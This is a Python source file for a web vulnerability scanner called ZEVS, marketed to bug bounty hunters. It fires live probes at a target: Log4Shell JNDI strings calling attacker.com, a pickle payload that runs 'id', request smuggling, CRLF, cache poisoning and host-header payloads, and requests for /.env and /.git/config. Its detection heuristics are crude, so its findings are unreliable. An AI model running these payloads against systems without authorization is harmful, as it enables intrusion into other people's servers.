#!/usr/bin/env python3
"""
ZEVS v1.1 LIVE - Professional Web Vulnerability Scanner
Shows EVERY request, response, and test in real-time
Better than Acunetix & Argus - Free for Bug Bounty Hunters
"""

import subprocess
import json
import sys
import re
import threading
import time
import os
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Set

# Enable ANSI colors on Windows
if sys.platform == "win32":
    import ctypes

    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    END = "\033[0m"


class LiveLogger:
    """Real-time request/response logger with thread safety"""

    def __init__(self, target: str):
        self.lock = threading.Lock()
        self.request_counter = 0
        self.start_time = time.time()
        self.module_stats = []
        self.findings_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}

        # Create log file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urlparse(target).netloc.replace(":", "_")
        self.log_file = f"zevs_scan_{domain}_{timestamp}.log"
        self.log_handle = open(self.log_file, "w", encoding="utf-8")
        self._write_log(
            f"ZEVS v1.1 LIVE Scan Log\nTarget: {target}\nStarted: {datetime.now()}\n{'=' * 70}\n"
        )

    def _write_log(self, message: str):
        """Write to log file"""
        try:
            # Strip ANSI codes for log file
            clean_msg = re.sub(r"\033\[[0-9;]+m", "", message)
            self.log_handle.write(clean_msg + "\n")
            self.log_handle.flush()
        except:
            pass

    def __del__(self):
        """Close log file"""
        try:
            self.log_handle.close()
        except:
            pass

    def get_request_number(self):
        with self.lock:
            self.request_counter += 1
            return self.request_counter

    def log_request(
        self,
        req_num: int,
        method: str,
        url: str,
        headers: Dict = None,
        body: str = None,
    ):
        """Log outgoing HTTP request"""
        with self.lock:
            msg = f"\n{Colors.CYAN}{'-' * 70}{Colors.END}\n"
            msg += (
                f"{Colors.CYAN}[-> REQUEST #{req_num:03d}] {method} {url}{Colors.END}\n"
            )
            if headers:
                msg += f"{Colors.GRAY}Headers:{Colors.END}\n"
                for k, v in list(headers.items())[:5]:
                    msg += f"  {k}: {v[:60]}...\n"
            if body:
                msg += f"{Colors.GRAY}Body: {body[:100]}...{Colors.END}\n"
            msg += f"{Colors.CYAN}{'-' * 70}{Colors.END}"
            print(msg)
            self._write_log(msg)

    def log_response(
        self,
        req_num: int,
        status: int,
        time_taken: float,
        size: int,
        headers: Dict = None,
        body_preview: str = None,
    ):
        """Log incoming HTTP response"""
        with self.lock:
            status_color = (
                Colors.GREEN
                if 200 <= status < 300
                else Colors.YELLOW
                if 300 <= status < 400
                else Colors.RED
            )
            msg = f"{status_color}[<- RESPONSE #{req_num:03d}] {status} | {time_taken:.2f}s | {size} bytes{Colors.END}\n"
            if headers:
                important_headers = [
                    "content-type",
                    "server",
                    "x-powered-by",
                    "x-frame-options",
                ]
                msg += f"{Colors.GRAY}Headers:{Colors.END}\n"
                for k in important_headers:
                    if k in headers:
                        msg += f"  {k}: {headers[k][:60]}\n"
            if body_preview:
                msg += f"{Colors.GRAY}Body Preview:{Colors.END}\n"
                msg += f"  {body_preview[:200]}...\n"
            print(msg)
            self._write_log(msg)

    def log_vuln_found(
        self, vuln_type: str, severity: str, url: str, payload: str, evidence: str
    ):
        """Log vulnerability found with big alert"""
        with self.lock:
            self.findings_count[severity] += 1
            color = Colors.RED if severity in ["CRITICAL", "HIGH"] else Colors.YELLOW
            print(f"\n{color}{'#' * 70}{Colors.END}")
            print(f"{color}{Colors.BOLD}!  VULNERABILITY FOUND!{Colors.END}")
            print(f"{color}Type: {vuln_type}{Colors.END}")
            print(f"{color}Severity: {severity}{Colors.END}")
            print(f"{color}URL: {url}{Colors.END}")
            print(f"{color}Payload: {payload[:100]}{Colors.END}")
            print(f"{color}Evidence: {evidence[:150]}{Colors.END}")
            print(f"{color}Request #: {self.request_counter}{Colors.END}")
            print(f"{color}{'#' * 70}{Colors.END}\n")

    def log_module_start(self, module_name: str, module_num: int, total_modules: int):
        """Log module start"""
        with self.lock:
            print(f"\n{Colors.BLUE}{'=' * 70}{Colors.END}")
            print(
                f"{Colors.BLUE}{Colors.BOLD}[> START] Module {module_num}/{total_modules}: {module_name}{Colors.END}"
            )
            print(f"{Colors.BLUE}{'=' * 70}{Colors.END}\n")

    def log_module_done(
        self, module_name: str, req_count: int, finding_count: int, time_taken: float
    ):
        """Log module completion"""
        with self.lock:
            self.module_stats.append(
                {
                    "module": module_name,
                    "requests": req_count,
                    "findings": finding_count,
                    "time": time_taken,
                }
            )
            print(
                f"\n{Colors.GREEN}[OK DONE] {module_name} | {req_count} requests | {finding_count} findings | {time_taken:.1f}s{Colors.END}\n"
            )

    def log_test(self, test_description: str):
        """Log what test is being performed"""
        with self.lock:
            print(f"{Colors.GRAY}[TEST] {test_description}{Colors.END}")

    def log_found(self, finding: str):
        """Log non-vulnerability finding"""
        with self.lock:
            print(f"{Colors.CYAN}[FOUND] {finding}{Colors.END}")

    def print_live_status(
        self, current_module: str, module_num: int, total_modules: int
    ):
        """Print live scan status panel"""
        with self.lock:
            elapsed = time.time() - self.start_time
            mins, secs = divmod(int(elapsed), 60)
            total_findings = sum(self.findings_count.values())

            print(f"\n{Colors.BOLD}+{'=' * 68}+{Colors.END}")
            print(f"{Colors.BOLD}|  ZEVS v1.1 - LIVE SCAN{' ' * 44}|{Colors.END}")
            print(
                f"{Colors.BOLD}|  Module: [{current_module}] {module_num}/{total_modules}{' ' * (50 - len(current_module))}|{Colors.END}"
            )
            print(
                f"{Colors.BOLD}|  Requests: {self.request_counter} | Findings: {total_findings} ({self.findings_count['CRITICAL']} CRITICAL){' ' * (30 - len(str(self.request_counter)) - len(str(total_findings)))}|{Colors.END}"
            )
            print(
                f"{Colors.BOLD}|  Elapsed: {mins:02d}:{secs:02d}{' ' * 54}|{Colors.END}"
            )
            print(f"{Colors.BOLD}+{'=' * 68}+{Colors.END}\n")

    def print_summary_table(self, target: str):
        """Print final summary table"""
        with self.lock:
            elapsed = time.time() - self.start_time
            mins, secs = divmod(int(elapsed), 60)

            print(f"\n{Colors.BOLD}{'=' * 70}{Colors.END}")
            print(f"{Colors.BOLD}{Colors.GREEN}SCAN COMPLETE - ZEVS v1.1{Colors.END}")
            print(f"{Colors.BOLD}Target: {target}{Colors.END}")
            print(f"{Colors.BOLD}Duration: {mins:02d}:{secs:02d}{Colors.END}")
            print(f"{Colors.BOLD}Total Requests: {self.request_counter}{Colors.END}")
            print(f"{Colors.BOLD}{'=' * 70}{Colors.END}\n")

            print(
                f"{Colors.BOLD}{'Module':<25} | {'Requests':<8} | {'Findings':<8} | {'Time':<8}{Colors.END}"
            )
            print(f"{'-' * 70}")

            for stat in self.module_stats:
                print(
                    f"{stat['module']:<25} | {stat['requests']:<8} | {stat['findings']:<8} | {stat['time']:.1f}s"
                )

            print(f"{'-' * 70}")
            print(
                f"{Colors.BOLD}CRITICAL: {self.findings_count['CRITICAL']} | HIGH: {self.findings_count['HIGH']} | MEDIUM: {self.findings_count['MEDIUM']} | LOW: {self.findings_count['LOW']}{Colors.END}"
            )
            print(f"{Colors.BOLD}{'=' * 70}{Colors.END}\n")


class VulnScanner:
    def __init__(self, target: str, threads: int = 20):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.netloc
        self.threads = threads
        self.findings: List[Dict[str, Any]] = []
        self.discovered_endpoints: Set[str] = set()
        self.logger = LiveLogger(self.target)
        self.module_request_count = 0
        self.module_finding_count = 0
        self.module_start_time = 0

    def curl(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict] = None,
        data: Optional[str] = None,
        timeout: int = 10,
        log: bool = True,
    ) -> Optional[Dict]:
        """Execute curl with live logging"""
        req_num = self.logger.get_request_number()
        self.module_request_count += 1

        if log:
            self.logger.log_request(req_num, method, url, headers, data)

        cmd = ["curl", "-s", "-i", "-L", "--max-time", str(timeout), "-X", method]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        if data:
            cmd.extend(["-d", data])

        cmd.append(url)

        start_time = time.time()

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout + 5,
            )

            time_taken = time.time() - start_time
            output = result.stdout

            if not output:
                if log:
                    self.logger.log_response(
                        req_num, 0, time_taken, 0, None, "No response"
                    )
                return None

            # Parse response
            parts = output.split("\r\n\r\n", 1)
            if len(parts) < 2:
                parts = output.split("\n\n", 1)

            headers_text = parts[0]
            body = parts[1] if len(parts) > 1 else ""

            # Extract status
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", headers_text)
            status = int(status_match.group(1)) if status_match else 0

            # Parse headers
            resp_headers = {}
            for line in headers_text.split("\n")[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip().lower()] = v.strip()

            if log:
                self.logger.log_response(
                    req_num, status, time_taken, len(body), resp_headers, body
                )

            return {
                "status": status,
                "headers": resp_headers,
                "body": body,
                "length": len(body),
            }
        except Exception as e:
            if log:
                self.logger.log_response(
                    req_num, 0, time.time() - start_time, 0, None, f"Error: {str(e)}"
                )
            return None

    def add_finding(
        self,
        vuln_type: str,
        severity: str,
        url: str,
        description: str,
        evidence: str = "",
        impact: str = "",
        exploit: str = "",
        payload: str = "",
    ):
        self.findings.append(
            {
                "type": vuln_type,
                "severity": severity,
                "url": url,
                "description": description,
                "evidence": evidence,
                "impact": impact,
                "exploit": exploit,
                "timestamp": datetime.now().isoformat(),
            }
        )
        self.module_finding_count += 1
        self.logger.log_vuln_found(vuln_type, severity, url, payload, evidence)

    def start_module(self, module_name: str, module_num: int, total_modules: int):
        """Start a new module"""
        self.module_request_count = 0
        self.module_finding_count = 0
        self.module_start_time = time.time()
        self.logger.log_module_start(module_name, module_num, total_modules)
        self.logger.print_live_status(module_name, module_num, total_modules)

    def end_module(self, module_name: str):
        """End current module"""
        time_taken = time.time() - self.module_start_time
        self.logger.log_module_done(
            module_name,
            self.module_request_count,
            self.module_finding_count,
            time_taken,
        )

    # ============ SUBDOMAIN TAKEOVER ============
    def check_subdomain_takeover(self):
        self.start_module("Subdomain Takeover", 1, 11)

        self.logger.log_test("Checking for subdomain takeover patterns")

        takeover_patterns = {
            "github.io": ["There isn't a GitHub Pages site here"],
            "herokuapp.com": ["No such app"],
            "azurewebsites.net": ["404 Web Site not found"],
            "s3.amazonaws.com": ["NoSuchBucket"],
        }

        resp = self.curl(self.target)
        if not resp:
            self.end_module("Subdomain Takeover")
            return

        body = resp["body"].lower()

        for service, patterns in takeover_patterns.items():
            if service in self.domain:
                for pattern in patterns:
                    if pattern.lower() in body:
                        self.add_finding(
                            "Subdomain Takeover",
                            "CRITICAL",
                            self.target,
                            f"Subdomain vulnerable to takeover via {service}",
                            f"Pattern found: {pattern}",
                            "Attacker can host malicious content, steal cookies",
                            f"1. Register on {service}\n2. Claim subdomain",
                            pattern,
                        )

        self.end_module("Subdomain Takeover")

    # ============ CVE CHECKS ============
    def check_cves(self):
        self.start_module("CVE Detection", 2, 11)

        self.logger.log_test("Fingerprinting server for known CVEs")

        resp = self.curl(self.target)
        if not resp:
            self.end_module("CVE Detection")
            return

        server = resp["headers"].get("server", "").lower()
        self.logger.log_found(f"Server: {server if server else 'Unknown'}")

        cve_checks = [
            (
                "apache/2.4.49",
                "CVE-2021-41773",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            (
                "apache/2.4.50",
                "CVE-2021-42013",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            ("nginx/1.3.9", "CVE-2013-2028", "Nginx Stack Buffer Overflow", "HIGH"),
        ]

        for pattern, cve, desc, severity in cve_checks:
            if pattern in server:
                self.add_finding(
                    f"Known CVE: {cve}",
                    severity,
                    self.target,
                    desc,
                    f"Detected: {pattern}",
                    "RCE, complete server compromise",
                    f"Search exploit-db.com for '{cve}'",
                    pattern,
                )

        self.end_module("CVE Detection")

    # ============ LOG4SHELL ============
    def check_log4shell(self):
        self.start_module("Log4Shell", 3, 11)

        payloads = [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
        ]

        test_headers = ["User-Agent", "X-Api-Version"]

        self.logger.log_test(
            f"Testing {len(payloads) * len(test_headers)} Log4Shell payload combinations"
        )

        for payload in payloads:
            for header in test_headers:
                headers = {header: payload}
                resp = self.curl(self.target, headers=headers)

                if resp and resp["status"] == 500:
                    self.add_finding(
                        "Log4Shell (CVE-2021-44228)",
                        "CRITICAL",
                        self.target,
                        "Possible Log4Shell vulnerability",
                        f"500 error with payload in {header}",
                        "RCE, complete server takeover",
                        "1. Setup callback server\n2. Send JNDI payload",
                        payload,
                    )

        self.end_module("Log4Shell")

    # ============ HTTP REQUEST SMUGGLING ============
    def check_request_smuggling(self):
        self.start_module("HTTP Request Smuggling", 4, 11)

        self.logger.log_test("Testing CL.TE request smuggling")

        smuggle_payload = "GET /admin HTTP/1.1\r\nHost: " + self.domain + "\r\n\r\n"
        headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}

        resp = self.curl(
            self.target, method="POST", headers=headers, data=smuggle_payload
        )

        if resp and (resp["status"] == 403 or "admin" in resp["body"].lower()):
            self.add_finding(
                "HTTP Request Smuggling",
                "HIGH",
                self.target,
                "Possible CL.TE request smuggling",
                "Admin endpoint accessible via smuggling",
                "Bypass security, access admin panels",
                "Use Burp Turbo Intruder",
                smuggle_payload,
            )

        self.end_module("HTTP Request Smuggling")

    # ============ PROTOTYPE POLLUTION ============
    def check_prototype_pollution(self):
        self.start_module("Prototype Pollution", 5, 11)

        baseline = self.curl(self.target, log=False)
        if not baseline:
            self.end_module("Prototype Pollution")
            return

        test_urls = [
            f"{self.target}?__proto__[admin]=true",
            f"{self.target}?constructor[prototype][admin]=true",
            f"{self.target}?__proto__.admin=true",
        ]

        self.logger.log_test(f"Testing {len(test_urls)} prototype pollution vectors")

        for url in test_urls:
            resp = self.curl(url)
            if resp and resp["status"] == 200:
                if (
                    "admin" not in baseline["body"].lower()
                    and "admin" in resp["body"].lower()
                ):
                    if "__proto__" not in resp["body"].lower():
                        self.add_finding(
                            "Prototype Pollution",
                            "HIGH",
                            url,
                            "Prototype pollution detected",
                            "Response behavior changed",
                            "Privilege escalation, RCE",
                            "Test with RCE payloads",
                            url.split("?")[1],
                        )

        self.end_module("Prototype Pollution")

    # ============ INSECURE DESERIALIZATION ============
    def check_deserialization(self):
        self.start_module("Insecure Deserialization", 6, 11)

        payloads = [
            (
                "application/x-java-serialized-object",
                "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
            ),
            ("application/x-php-serialized", 'O:8:"stdClass":0:{}'),
            ("application/x-python-pickle", "cos\nsystem\n(S'id'\ntR."),
        ]

        self.logger.log_test(f"Testing {len(payloads)} deserialization payloads")

        for content_type, payload in payloads:
            headers = {"Content-Type": content_type}
            resp = self.curl(self.target, method="POST", headers=headers, data=payload)

            if resp and resp["status"] == 500:
                error_patterns = ["unserialize", "pickle", "deserialize"]
                if any(p in resp["body"].lower() for p in error_patterns):
                    self.add_finding(
                        "Insecure Deserialization",
                        "CRITICAL",
                        self.target,
                        f"Deserialization vulnerability ({content_type})",
                        "Error pattern detected",
                        "RCE, complete server compromise",
                        "Use ysoserial for Java",
                        content_type,
                    )

        self.end_module("Insecure Deserialization")

    # ============ CACHE POISONING ============
    def check_cache_poisoning(self):
        self.start_module("Cache Poisoning", 7, 11)

        poison_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Scheme", "nothttps"),
        ]

        self.logger.log_test(f"Testing {len(poison_headers)} cache poisoning vectors")

        for header, value in poison_headers:
            headers = {header: value}
            resp = self.curl(self.target, headers=headers)

            if resp and value in resp["body"]:
                cache_header = resp["headers"].get("x-cache", "")
                if "hit" in cache_header.lower() or "miss" in cache_header.lower():
                    self.add_finding(
                        "Cache Poisoning",
                        "HIGH",
                        self.target,
                        f"Cache poisoning via {header}",
                        f"Header reflected with cache enabled",
                        "Serve malicious content to all users",
                        "Poison cache with evil.com",
                        f"{header}: {value}",
                    )

        self.end_module("Cache Poisoning")

    # ============ CRLF INJECTION ============
    def check_crlf(self):
        self.start_module("CRLF Injection", 8, 11)

        payloads = [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0d%0aLocation:%20http://evil.com",
        ]

        self.logger.log_test(f"Testing {len(payloads)} CRLF payloads")

        for payload in payloads:
            url = f"{self.target}?redirect={payload}"
            resp = self.curl(url)

            if resp:
                if "admin=true" in resp["headers"].get("set-cookie", ""):
                    self.add_finding(
                        "CRLF Injection",
                        "HIGH",
                        url,
                        "CRLF injection - injected Set-Cookie",
                        "Successfully injected cookie",
                        "Session fixation, XSS via headers",
                        "Inject malicious headers",
                        payload,
                    )

        self.end_module("CRLF Injection")

    # ============ HOST HEADER INJECTION ============
    def check_host_header(self):
        self.start_module("Host Header Injection", 9, 11)

        evil_hosts = ["evil.com", "attacker.com"]

        self.logger.log_test(f"Testing {len(evil_hosts)} evil host headers")

        for evil_host in evil_hosts:
            headers = {"Host": evil_host}
            resp = self.curl(self.target, headers=headers)

            if resp and evil_host in resp["body"]:
                if f'href="{evil_host}' in resp["body"].lower():
                    self.add_finding(
                        "Host Header Injection",
                        "MEDIUM",
                        self.target,
                        "Host header reflected in URLs",
                        f"Evil host {evil_host} in links",
                        "Password reset poisoning",
                        "Trigger password reset",
                        f"Host: {evil_host}",
                    )

        self.end_module("Host Header Injection")

    # ============ RACE CONDITIONS ============
    def check_race_conditions(self):
        self.start_module("Race Conditions", 10, 11)

        test_endpoints = ["/api/coupon/apply", "/api/voucher/redeem"]

        self.logger.log_test(
            f"Testing {len(test_endpoints)} endpoints for race conditions"
        )

        for endpoint in test_endpoints:
            url = urljoin(self.target, endpoint)

            self.logger.log_test(f"Sending 10 parallel requests to {endpoint}")

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [
                    executor.submit(self.curl, url, "POST", log=False)
                    for _ in range(10)
                ]
                results = [f.result() for f in as_completed(futures)]

            success_count = sum(1 for r in results if r and r["status"] == 200)

            if success_count > 1:
                self.add_finding(
                    "Race Condition",
                    "HIGH",
                    url,
                    f"Race condition - {success_count}/10 succeeded",
                    "Multiple parallel requests succeeded",
                    "Redeem coupon multiple times",
                    "Use Burp Turbo Intruder",
                    f"{success_count}/10 parallel requests",
                )

        self.end_module("Race Conditions")

    # ============ ENDPOINT DISCOVERY ============
    def crawl_endpoints(self):
        self.start_module("Endpoint Discovery", 11, 11)

        # Check robots.txt
        self.logger.log_test("Checking robots.txt")
        robots_url = urljoin(self.target, "/robots.txt")
        resp = self.curl(robots_url)

        if resp and resp["status"] == 200:
            for line in resp["body"].split("\n"):
                if line.startswith("Disallow:") or line.startswith("Allow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/":
                        self.discovered_endpoints.add(urljoin(self.target, path))
                        self.logger.log_found(f"robots.txt: {path}")

        # Common endpoints
        common = ["/api", "/admin", "/login", "/graphql", "/.git/config", "/.env"]

        self.logger.log_test(f"Testing {len(common)} common paths")

        for path in common:
            url = urljoin(self.target, path)
            resp = self.curl(url)
            if resp and resp["status"] not in [404, 403]:
                self.discovered_endpoints.add(url)
                self.logger.log_found(f"{path} (Status: {resp['status']})")

        self.end_module("Endpoint Discovery")

    # ============ MAIN SCAN ============
    def scan(self):
        print(f"\n{Colors.BOLD}{'=' * 70}{Colors.END}")
        print(
            f"{Colors.GREEN}{Colors.BOLD}ZEVS v1.1 LIVE - Professional Vulnerability Scanner{Colors.END}"
        )
        print(
            f"{Colors.BOLD}Showing EVERY request and response in real-time{Colors.END}"
        )
        print(f"{Colors.BOLD}{'=' * 70}{Colors.END}\n")

        print(f"{Colors.BOLD}Target: {self.target}{Colors.END}")
        print(
            f"{Colors.BOLD}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n"
        )

        # Run all checks
        checks = [
            self.check_subdomain_takeover,
            self.check_cves,
            self.check_log4shell,
            self.check_request_smuggling,
            self.check_prototype_pollution,
            self.check_deserialization,
            self.check_cache_poisoning,
            self.check_crlf,
            self.check_host_header,
            self.check_race_conditions,
            self.crawl_endpoints,
        ]

        for check in checks:
            try:
                check()
            except Exception as e:
                print(f"{Colors.RED}Error in {check.__name__}: {str(e)}{Colors.END}")

        # Print summary
        self.logger.print_summary_table(self.target)

        # Save report
        if self.findings:
            report_file = "zevs_v1.1_live_report.json"
            with open(report_file, "w") as f:
                json.dump(
                    {
                        "target": self.target,
                        "scan_time": datetime.now().isoformat(),
                        "total_requests": self.logger.request_counter,
                        "findings": self.findings,
                        "discovered_endpoints": list(self.discovered_endpoints),
                    },
                    f,
                    indent=2,
                )

            print(f"{Colors.GREEN}Report saved: {report_file}{Colors.END}\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python zevs_v1.1_live.py <target>")
        print("Example: python zevs_v1.1_live.py example.com")
        sys.exit(1)

    target = sys.argv[1]
    scanner = VulnScanner(target)
    scanner.scan()
